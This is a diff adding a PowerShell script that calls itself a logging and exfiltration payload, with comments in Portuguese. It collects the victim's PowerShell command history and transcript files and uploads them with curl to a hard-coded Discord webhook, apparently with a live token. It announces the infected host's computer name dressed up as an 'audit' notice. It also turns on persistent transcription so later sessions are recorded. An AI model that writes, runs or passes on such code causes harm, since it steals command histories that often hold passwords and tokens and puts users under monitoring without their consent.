@@ -1,0 +1,24 @@
+# PAYLOAD (.ps1) - Global PowerShell Logging & Exfil
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# 1. Configurar Alvos (Logs de PowerShell e Histórico de Comandos)
+$e = @('ConsoleHost_history.txt', 'PowerShell_Transcript.*.txt')
+$p = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine"
+$d = [Environment]::GetFolderPath('MyDocuments')
+
+# 2. Notificação Inicial
+curl.exe -k -s -F ('payload=' + [char]64 + 'Auditoria iniciada no host: ' + $env:COMPUTERNAME) $u
+
+# 3. Procurar e Enviar Logs existentes
+$logs = Get-ChildItem -Path $p, $d -Include $e -Recurse -ErrorAction SilentlyContinue
+foreach ($i in $logs) {
+    if ($i.Length -lt 24MB) {
+        $a = 'file=' + [char]64 + $i.FullName
+        curl.exe -k -s -F $a $u
+    }
+}
+
+# 4. Ativar transcrição (Logging ativo) para sessões futuras
+Start-Transcript -Path "$d\PowerShell_Transcript.txt" -Append -Force
+
+exit
